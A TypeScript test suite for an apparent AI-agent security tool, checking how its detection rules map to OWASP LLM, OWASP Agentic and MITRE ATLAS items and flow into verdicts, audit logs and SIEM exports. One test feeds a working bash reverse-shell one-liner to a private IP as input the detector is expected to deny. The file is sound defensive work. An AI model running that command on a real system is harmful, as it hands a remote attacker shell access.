import { mkdir, mkdtemp, readdir, readFile, rm, writeFile } from "node:fs/promises";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { fileURLToPath } from "node:url";
import { afterEach, describe, expect, it, vi } from "vitest";
import { buildIncidentEntry, buildRuntimeVerdictEntry } from "../audit-log.js";
import { DecisionEngine } from "../engine.js";
import {
	FRAMEWORK_IDS,
	frameworkItemLabel,
	frameworkOfItem,
	MITRE_ATLAS_TACTICS,
	MITRE_ATLAS_TECHNIQUES,
	OWASP_AGENTIC_2026,
	OWASP_LLM_2025,
} from "../framework-catalog.js";
import {
	buildCoverageMatrix,
	buildDashboardCoverageArtifact,
	coverageMatrixToJson,
	type FrameworkMappings,
	frameworkRefsFromJson,
	parseFrameworkMappings,
	parseFrameworkMappingsYaml,
	renderCoverageDocument,
	renderCoverageMarkdown,
	renderCoverageTable,
	resolveRuleFrameworks,
	toCoverageRules,
	validateFrameworkMappingsAgainstRules,
} from "../framework-mappings.js";
import { HeuristicsEngine } from "../heuristics.js";
import { correlateIncidents } from "../incidents/correlate.js";
import { normalizeAuditEntriesToSignals } from "../incidents/normalize.js";
import { exportToCEF, exportToJSON, exportToLEEF } from "../siem-export.js";
import { loadThreats } from "../threat-loader.js";
import type { Logger } from "../types.js";

const repoRoot = fileURLToPath(new URL("../../../../", import.meta.url));
const threatsDir = join(repoRoot, "threats");
const mappingPath = join(threatsDir, "mappings", "frameworks.yaml");

async function loadRepositoryMapping(): Promise<FrameworkMappings> {
	const { mappings, errors } = parseFrameworkMappingsYaml(await readFile(mappingPath, "utf8"));
	expect(errors).toEqual([]);
	if (!mappings) throw new Error("mapping did not parse");
	return mappings;
}

/** Rule ids exactly as `grep -h '^- id:' threats/*.yaml` sees them. */
async function grepRuleIds(): Promise<string[]> {
	const files = (await readdir(threatsDir)).filter((name) => name.endsWith(".yaml"));
	const ids: string[] = [];
	for (const file of files) {
		const text = await readFile(join(threatsDir, file), "utf8");
		for (const match of text.matchAll(/^- id:\s*"?([^"\s]+)"?/gm)) ids.push(match[1] as string);
	}
	return ids;
}

function minimalMapping(overrides: Record<string, unknown> = {}): Record<string, unknown> {
	const owasp = (ids: readonly { id: string }[]) =>
		Object.fromEntries(
			ids.map(({ id }) => [id, { status: "not_applicable", rationale: "Not observable here." }]),
		);
	return {
		schema_version: 1,
		assessments: {
			owasp_llm: owasp(OWASP_LLM_2025),
			owasp_agentic: owasp(OWASP_AGENTIC_2026),
			mitre_atlas: {},
		},
		defaults: { files: {}, categories: {} },
		rules: {},
		...overrides,
	};
}

describe("framework catalog", () => {
	it("lists the ten OWASP LLM 2025 and ten OWASP Agentic 2026 items in order", () => {
		expect(OWASP_LLM_2025.map((item) => item.id)).toEqual(
			Array.from({ length: 10 }, (_, i) => `LLM${String(i + 1).padStart(2, "0")}`),
		);
		expect(OWASP_AGENTIC_2026.map((item) => item.id)).toEqual(
			Array.from({ length: 10 }, (_, i) => `ASI${String(i + 1).padStart(2, "0")}`),
		);
		expect(OWASP_LLM_2025[0]?.title).toBe("Prompt Injection");
		expect(OWASP_AGENTIC_2026[0]?.title).toBe("Agent Goal Hijack");
		expect(OWASP_AGENTIC_2026[9]?.title).toBe("Rogue Agents");
	});

	it("holds well-formed ATLAS 2026.09 techniques whose tactics and parents exist", () => {
		const ids = Object.keys(MITRE_ATLAS_TECHNIQUES);
		expect(ids).toHaveLength(208);
		expect(Object.keys(MITRE_ATLAS_TACTICS)).toHaveLength(16);
		for (const id of ids) {
			expect(id).toMatch(/^AML\.T\d{4}(\.\d{3})?$/);
			const technique = MITRE_ATLAS_TECHNIQUES[id];
			expect(technique?.name.length).toBeGreaterThan(0);
			expect(technique?.tactics.length).toBeGreaterThan(0);
			for (const tactic of technique?.tactics ?? [])
				expect(MITRE_ATLAS_TACTICS).toHaveProperty([tactic]);
			if (id.length > 9) expect(MITRE_ATLAS_TECHNIQUES).toHaveProperty([id.slice(0, 9)]);
		}
		expect(MITRE_ATLAS_TECHNIQUES["AML.T0051"]?.name).toBe("LLM Prompt Injection");
		expect(MITRE_ATLAS_TECHNIQUES["AML.T0053"]?.name).toBe("AI Agent Tool Invocation");
	});

	it("classifies IDs and rejects anything that is not an official identifier", () => {
		expect(frameworkOfItem("LLM01")).toBe("owasp_llm");
		expect(frameworkOfItem("ASI10")).toBe("owasp_agentic");
		expect(frameworkOfItem("AML.T0051.001")).toBe("mitre_atlas");
		for (const bad of ["LLM11", "LLM01:2025", "ASI00", "AML.T9999", "T1059", "toString", ""]) {
			expect(frameworkOfItem(bad)).toBeNull();
		}
		expect(frameworkItemLabel("LLM01")).toBe("LLM01:2025");
		expect(frameworkItemLabel("ASI02")).toBe("ASI02:2026");
		expect(frameworkItemLabel("AML.T0050")).toBe("AML.T0050");
	});
});

describe("threats/mappings/frameworks.yaml against the shipped rules", async () => {
	const mappings = await loadRepositoryMapping();
	const threats = await loadThreats(threatsDir);
	const rules = toCoverageRules(threats);

	it("is not a rules file: the rule-count grep and the loader still see only threats/*.yaml", async () => {
		const grepIds = await grepRuleIds();
		expect(new Set(grepIds).size).toBe(grepIds.length);
		expect(threats.map((threat) => threat.id).sort()).toEqual([...grepIds].sort());
		expect(await readFile(mappingPath, "utf8")).not.toMatch(/^- id:/m);
		expect(threats.every((threat) => threat.sourceFile?.endsWith(".yaml"))).toBe(true);
	});

	it("maps every shipped rule, and every mapping entry names a shipped rule", () => {
		expect(validateFrameworkMappingsAgainstRules(mappings, rules)).toEqual([]);
		expect(Object.keys(mappings.rules).sort()).toEqual(rules.map((rule) => rule.id).sort());
	});

	it("gives every rule at least one OWASP item and only official IDs", () => {
		for (const rule of rules) {
			const refs = resolveRuleFrameworks(mappings, rule);
			expect(refs, rule.id).not.toBeNull();
			expect(
				(refs?.owaspLlm.length ?? 0) + (refs?.owaspAgentic.length ?? 0),
				rule.id,
			).toBeGreaterThan(0);
			expect(refs?.owaspLlm.every((id) => frameworkOfItem(id) === "owasp_llm")).toBe(true);
			expect(refs?.owaspAgentic.every((id) => frameworkOfItem(id) === "owasp_agentic")).toBe(true);
			expect(refs?.mitreAtlas.every((id) => frameworkOfItem(id) === "mitre_atlas")).toBe(true);
		}
	});

	it("attaches the resolved mapping to every loaded rule", () => {
		for (const threat of threats) {
			expect(threat.frameworks, threat.id).toEqual(
				resolveRuleFrameworks(mappings, {
					id: threat.id,
					category: threat.category,
					sourceFile: threat.sourceFile,
				}),
			);
		}
		const reverseShell = threats.find((threat) => threat.id === "CLT-CMD-003");
		expect(reverseShell?.frameworks?.mitreAtlas).toContain("AML.T0072");
		expect(reverseShell?.frameworks?.owaspAgentic).toContain("ASI05");
	});

	it("keeps the generated doc and dashboard artifact in sync (pnpm coverage:frameworks -- --write)", async () => {
		const matrix = buildCoverageMatrix(mappings, rules);
		expect(await readFile(join(repoRoot, "docs", "framework-coverage.md"), "utf8")).toBe(
			renderCoverageDocument(matrix),
		);
		const artifact = await readFile(
			join(repoRoot, "packages", "dashboard", "src", "generated", "framework-coverage.json"),
			"utf8",
		);
		expect(artifact).toBe(
			`${JSON.stringify(buildDashboardCoverageArtifact(mappings, rules), null, 2)}\n`,
		);
	});
});

describe("mapping file schema", () => {
	it("accepts a minimal valid document", () => {
		const { mappings, errors } = parseFrameworkMappings(minimalMapping());
		expect(errors).toEqual([]);
		expect(mappings?.schemaVersion).toBe(1);
	});

	it.each([
		["wrong schema version", { schema_version: 2 }, "schema_version"],
		["unofficial ID in a rule", { rules: { "R-1": ["LLM11"] } }, '"LLM11" is not an official'],
		["edition suffix in an ID", { rules: { "R-1": ["LLM01:2025"] } }, "not an official"],
		["duplicate ID", { rules: { "R-1": ["ASI02", "ASI02"] } }, "duplicate ID ASI02"],
		["rule value not a list", { rules: { "R-1": "ASI02" } }, "expected a list"],
		["unknown ATLAS technique", { defaults: { files: { "x.yaml": ["AML.T9999"] } } }, "AML.T9999"],
		["rules missing", { rules: undefined }, "rules: expected a mapping"],
	])("rejects %s", (_name, override, message) => {
		const { mappings, errors } = parseFrameworkMappings(minimalMapping(override));
		expect(mappings).toBeNull();
		expect(errors.join("\n")).toContain(message);
	});

	it("rejects bad assessments and requires one for every OWASP item", () => {
		const base = minimalMapping();
		const assessments = base.assessments as Record<string, Record<string, unknown>>;
		const llm = { ...assessments.owasp_llm } as Record<string, unknown>;
		delete llm.LLM04;
		llm.LLM01 = { status: "mostly", rationale: "A rationale that is long enough." };
		llm.LLM02 = { status: "covered", rationale: "short" };
		const { mappings, errors } = parseFrameworkMappings({
			...base,
			assessments: {
				...assessments,
				owasp_llm: llm,
				mitre_atlas: { ASI01: { status: "covered", rationale: "Wrong framework bucket here." } },
			},
		});
		expect(mappings).toBeNull();
		const text = errors.join("\n");
		expect(text).toContain("LLM04: every OWASP item needs an assessment");
		expect(text).toContain("LLM01.status");
		expect(text).toContain("LLM02.rationale");
		expect(text).toContain("assessments.mitre_atlas.ASI01: not an official MITRE ATLAS ID");
	});

	it("reports invalid YAML instead of throwing", () => {
		const { mappings, errors } = parseFrameworkMappingsYaml("rules: [unclosed");
		expect(mappings).toBeNull();
		expect(errors[0]).toMatch(/invalid YAML/);
	});
});

describe("resolution and consistency checks", () => {
	const doc = minimalMapping({
		assessments: {
			owasp_llm: {
				...Object.fromEntries(
					OWASP_LLM_2025.map(({ id }) => [
						id,
						{ status: "not_applicable", rationale: "Not observable here." },
					]),
				),
				LLM06: { status: "covered", rationale: "Every rule in this fixture maps here." },
			},
			owasp_agentic: Object.fromEntries(
				OWASP_AGENTIC_2026.map(({ id }) => [
					id,
					{
						status: id === "ASI05" ? "partial" : "not_covered",
						rationale: "Fixture rationale text.",
					},
				]),
			),
			mitre_atlas: { "AML.T0050": { status: "covered", rationale: "Fixture rationale text." } },
		},
		defaults: { files: { "a.yaml": ["LLM06"] }, categories: { exec: ["AML.T0050"] } },
		rules: { "A-1": ["ASI05"], "A-2": [] },
	});

	it("unions file default, category default and the rule entry, sorted per framework", () => {
		const { mappings } = parseFrameworkMappings(doc);
		if (!mappings) throw new Error("fixture must parse");
		expect(
			resolveRuleFrameworks(mappings, { id: "A-1", category: "exec", sourceFile: "a.yaml" }),
		).toEqual({ owaspLlm: ["LLM06"], owaspAgentic: ["ASI05"], mitreAtlas: ["AML.T0050"] });
		expect(
			resolveRuleFrameworks(mappings, { id: "A-2", category: "other", sourceFile: "b.yaml" }),
		).toBeNull();
		// Prototype keys are never treated as rule or category entries.
		expect(
			resolveRuleFrameworks(mappings, {
				id: "constructor",
				category: "__proto__",
				sourceFile: "b.yaml",
			}),
		).toBeNull();
	});

	it("flags unmapped rules, stale entries and assessments that disagree with the counts", () => {
		const { mappings } = parseFrameworkMappings(doc);
		if (!mappings) throw new Error("fixture must parse");
		const problems = validateFrameworkMappingsAgainstRules(mappings, [
			{ id: "A-1", category: "exec", sourceFile: "a.yaml", title: "one" },
			{ id: "B-1", category: "misc", sourceFile: "b.yaml", title: "unmapped" },
		]);
		expect(problems).toContain(
			"rule B-1 (b.yaml) has no entry in threats/mappings/frameworks.yaml",
		);
		expect(problems).toContain("mapping for unknown or inactive rule A-2");
		expect(problems).not.toContain("file default for unknown rule file a.yaml");

		const noOwasp = parseFrameworkMappings(
			minimalMapping({
				assessments: (doc as { assessments: unknown }).assessments,
				rules: { "C-1": ["AML.T0050"] },
			}),
		).mappings;
		if (!noOwasp) throw new Error("fixture must parse");
		const second = validateFrameworkMappingsAgainstRules(noOwasp, [
			{ id: "C-1", category: "x", sourceFile: "c.yaml", title: "atlas only" },
		]);
		expect(second).toContain("rule C-1 maps to no OWASP LLM or Agentic item");
		expect(second).toContain('LLM06 is assessed "covered" but 0 rule(s) map to it');
	});
});

describe("runtime propagation", async () => {
	const threats = await loadThreats(threatsDir);
	const engine = new HeuristicsEngine(threats);

	it("puts the matched rule's frameworks on the verdict and the audit entries", async () => {
		const matches = engine.match([
			{ type: "command", value: "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1" },
		]);
		expect(matches.length).toBeGreaterThan(0);
		const verdict = await new DecisionEngine("balanced").decide({
			heuristicMatches: matches,
			urlCheckResults: [],
		});
		expect(verdict.decision).toBe("deny");
		expect(verdict.frameworks).toBeDefined();
		const top = threats.find((threat) => threat.id === verdict.matchedThreatId);
		expect(verdict.frameworks).toEqual(top?.frameworks);

		const entry = buildRuntimeVerdictEntry("s1", "Bash", { command: "x" }, verdict);
		expect(entry.frameworks).toEqual({
			owasp_llm: verdict.frameworks?.owaspLlm,
			owasp_agentic: verdict.frameworks?.owaspAgentic,
			mitre_atlas: verdict.frameworks?.mitreAtlas,
		});
		const incident = buildIncidentEntry({
			incidentId: "inc-1",
			sessionId: "s1",
			toolName: "Bash",
			toolInput: { command: "x" },
			verdict,
			recommendedActions: ["review"],
		});
		expect(incident.frameworks).toEqual(entry.frameworks);
	});

	it("leaves frameworks off an allow verdict and its audit entry", async () => {
		const verdict = await new DecisionEngine().decide({
			heuristicMatches: [],
			urlCheckResults: [],
		});
		expect(verdict.frameworks).toBeUndefined();
		expect(buildRuntimeVerdictEntry("s", "Read", {}, verdict)).not.toHaveProperty("frameworks");
	});

	it("carries validated framework IDs into SIEM JSON, CEF and LEEF incident exports", () => {
		const entries = [
			{
				type: "runtime_verdict",
				timestamp: "2026-09-25T10:00:00.000Z",
				session_id: "sess-1",
				tool_name: "Bash",
				verdict: "deny",
				severity: "critical",
				matched_threat_id: "CLT-CMD-003",
				frameworks: {
					owasp_llm: ["LLM05", "LLM06"],
					owasp_agentic: ["ASI05", "NOT-AN-ID"],
					mitre_atlas: ["AML.T0072", "<script>"],
				},
			},
		];
		const incidents = correlateIncidents(normalizeAuditEntriesToSignals(entries));
		expect(incidents).toHaveLength(1);
		const [record] = JSON.parse(exportToJSON(incidents)) as Array<Record<string, unknown>>;
		expect(record?.frameworks).toEqual({
			owasp_llm: ["LLM05", "LLM06"],
			owasp_agentic: ["ASI05"],
			mitre_atlas: ["AML.T0072"],
		});
		const events = record?.events as Array<Record<string, unknown>>;
		expect(events[0]?.frameworks).toEqual(record?.frameworks);
		expect(exportToCEF(incidents)).toContain(
			"frameworks=LLM05:2025,LLM06:2025,ASI05:2026,AML.T0072",
		);
		expect(exportToLEEF(incidents)).toContain(
			"frameworks=LLM05:2025,LLM06:2025,ASI05:2026,AML.T0072",
		);
		expect(exportToJSON(incidents)).not.toContain("<script>");
	});

	it("exports no frameworks key when the audit entries carried none", () => {
		const incidents = correlateIncidents(
			normalizeAuditEntriesToSignals([
				{
					type: "runtime_verdict",
					timestamp: "2026-09-25T10:00:00.000Z",
					verdict: "deny",
					severity: "critical",
				},
			]),
		);
		const [record] = JSON.parse(exportToJSON(incidents)) as Array<Record<string, unknown>>;
		expect(record).not.toHaveProperty("frameworks");
		expect(exportToCEF(incidents)).not.toContain("frameworks=");
	});

	it("drops anything that is not an official ID when reading serialized frameworks", () => {
		expect(
			frameworkRefsFromJson({ owasp_llm: ["ASI01"], owasp_agentic: [1], mitre_atlas: "AML.T0050" }),
		).toBeNull();
		expect(frameworkRefsFromJson(null)).toBeNull();
		expect(frameworkRefsFromJson({ owasp_llm: ["LLM02", "LLM02", "LLM01"] })).toEqual({
			owaspLlm: ["LLM01", "LLM02"],
			owaspAgentic: [],
			mitreAtlas: [],
		});
	});
});

describe("loader behaviour when the mapping is absent or broken", () => {
	let dir: string | null = null;
	afterEach(async () => {
		if (dir) await rm(dir, { recursive: true, force: true });
		dir = null;
	});

	const rule = `- id: "T-1"
  category: "tool"
  severity: "high"
  confidence: 0.9
  action: "block"
  pattern: "evil"
  match_on: command
  title: "Test rule"
`;

	function logger(): Logger & { warn: ReturnType<typeof vi.fn> } {
		return { debug: vi.fn(), info: vi.fn(), warn: vi.fn(), error: vi.fn() } as unknown as Logger & {
			warn: ReturnType<typeof vi.fn>;
		};
	}

	it("loads rules without frameworks when no mapping file exists", async () => {
		dir = await mkdtemp(join(tmpdir(), "aidr-fw-"));
		await writeFile(join(dir, "rules.yaml"), rule);
		const log = logger();
		const threats = await loadThreats(dir, log);
		expect(threats).toHaveLength(1);
		expect(threats[0]?.frameworks).toBeUndefined();
		expect(threats[0]?.sourceFile).toBe("rules.yaml");
		expect(log.warn).not.toHaveBeenCalled();
	});

	it("still loads every rule and warns when the mapping file is invalid", async () => {
		dir = await mkdtemp(join(tmpdir(), "aidr-fw-"));
		await writeFile(join(dir, "rules.yaml"), rule);
		await mkdir(join(dir, "mappings"));
		await writeFile(
			join(dir, "mappings", "frameworks.yaml"),
			"schema_version: 1\nrules:\n  T-1: [NOPE]\n",
		);
		const log = logger();
		const threats = await loadThreats(dir, log);
		expect(threats).toHaveLength(1);
		expect(threats[0]?.frameworks).toBeUndefined();
		expect(log.warn).toHaveBeenCalledWith(
			expect.stringContaining("Framework mapping file is invalid"),
			expect.anything(),
		);
	});

	it("applies a valid mapping from the rule directory", async () => {
		dir = await mkdtemp(join(tmpdir(), "aidr-fw-"));
		await writeFile(join(dir, "rules.yaml"), rule);
		await mkdir(join(dir, "mappings"));
		const doc = minimalMapping({ rules: { "T-1": ["ASI02", "AML.T0053"] } });
		await writeFile(join(dir, "mappings", "frameworks.yaml"), JSON.stringify(doc));
		const threats = await loadThreats(dir);
		expect(threats[0]?.frameworks).toEqual({
			owaspLlm: [],
			owaspAgentic: ["ASI02"],
			mitreAtlas: ["AML.T0053"],
		});
	});
});

describe("coverage matrix rendering", async () => {
	const { mappings } = parseFrameworkMappingsYaml(await readFile(mappingPath, "utf8"));
	if (!mappings) throw new Error("repository mapping must parse");
	const rules = toCoverageRules(await loadThreats(threatsDir));
	const matrix = buildCoverageMatrix(mappings, rules);

	it("reports every OWASP item and only mapped ATLAS techniques, with consistent counts", () => {
		expect(matrix.ruleCount).toBe(rules.length);
		expect(matrix.frameworks.map((framework) => framework.id)).toEqual([...FRAMEWORK_IDS]);
		const [llm, agentic, atlas] = matrix.frameworks;
		expect(llm?.items).toHaveLength(10);
		expect(agentic?.items).toHaveLength(10);
		for (const framework of [llm, agentic]) {
			const counts = framework?.statusCounts;
			expect(
				(counts?.covered ?? 0) +
					(counts?.partial ?? 0) +
					(counts?.not_covered ?? 0) +
					(counts?.not_applicable ?? 0),
			).toBe(10);
			for (const item of framework?.items ?? []) {
				expect(item.exampleRules.length).toBe(Math.min(3, item.ruleCount));
				expect(item.rationale.length).toBeGreaterThan(20);
			}
		}
		expect(atlas?.items.every((item) => item.ruleCount > 0)).toBe(true);
		expect(atlas?.itemsTotal).toBe(Object.keys(MITRE_ATLAS_TECHNIQUES).length);
		expect(atlas?.tactics).toHaveLength(16);
		// Honest gaps stay visible.
		expect(llm?.items.find((item) => item.id === "LLM08")?.status).toBe("not_applicable");
		expect(agentic?.items.find((item) => item.id === "ASI07")?.status).toBe("not_covered");
	});

	it("renders table, markdown and snake_case JSON", () => {
		const table = renderCoverageTable(matrix);
		expect(table).toContain("OWASP Top 10 for LLM Applications 2025");
		expect(table).toContain("ASI07:2026");
		const markdown = renderCoverageMarkdown(matrix);
		expect(markdown).toContain("| LLM01:2025 | Prompt Injection |");
		expect(markdown).toContain("## MITRE ATLAS 2026.09");
		const json = coverageMatrixToJson(matrix);
		const first = (json.frameworks as Array<Record<string, unknown>>)[0];
		expect(first?.status_counts).toBeDefined();
		expect((first?.items as Array<Record<string, unknown>>)[0]).toHaveProperty("example_rules");
	});
});
